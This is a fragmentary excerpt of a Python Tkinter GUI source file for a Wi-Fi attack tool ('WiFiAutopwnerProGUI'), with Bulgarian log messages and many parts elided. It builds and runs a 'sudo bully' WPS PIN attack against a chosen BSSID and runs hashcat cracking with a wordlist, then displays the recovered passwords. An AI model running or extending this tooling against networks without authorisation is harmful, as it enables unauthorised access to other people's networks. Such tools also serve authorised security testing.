...
class WiFiAutopwnerProGUI(tk.Tk):
    def __init__(self):
        ...
        self.attack_threads = []
        self.output_dir = "/tmp/wifi_autopwner_pro"
...
#        self.ai_model = None
    ...
    def wps_attack(self, bssid=None):
        ...
        self.log_message(f"Стартиране на WPS атака срещу {bssid}")
        command = f"sudo bully -b {bssid} -i {self.interface.get()} -o {self.output_dir}/wps_cracked.txt"
        
        thread = threading.Thread(target=self.run_command, args=(command, "WPS атаката завърши.", "Грешка при WPS атака."))
        thread.start()
...
"""
    ...
    def start_cracking(self):
        ...
        self.log_message(f"Стартиране на кракване ({hash_type}) с {wordlist}")
        
        # Определяме режима на hashcat според типа хеш
        hash_mode = {
        ...
        thread = threading.Thread(target=self.run_cracking, args=(command,))
        thread.start()
        self.attack_threads.append(thread)

    def run_cracking(self, command):
        ...
        try:
            ...
            while process.poll() is None:
                ...
                if output:
                    self.crack_log.config(state="normal")
                    self.crack_log.insert(tk.END, output)
            ...
            if os.path.exists(f"{self.output_dir}/cracked.txt"):
                with open(f"{self.output_dir}/cracked.txt", "r") as f:
                    results = f.read()
                    if results:
                        self.log_message("Успешно намерени пароли!", "success")
                        self.crack_log.config(state="normal")
                        self.crack_log.insert(tk.END, "\n\nНамерени пароли:\n" + results)
                        self.crack_log.see(tk.END)
                        self.crack_log.config(state="disabled")
                    else:
                        self.log_message("Не са намерени пароли.", "warning")
            
        except Exception as e:
            self.log_message(f"Грешка при кракване: {str(e)}", "error")

    def stop_cracking(self):
        """Спира процеса на кракване."""
        self.run_command("sudo pkill hashcat", "кракването е спряно.", "Грешка при спиране на кракване.", False)
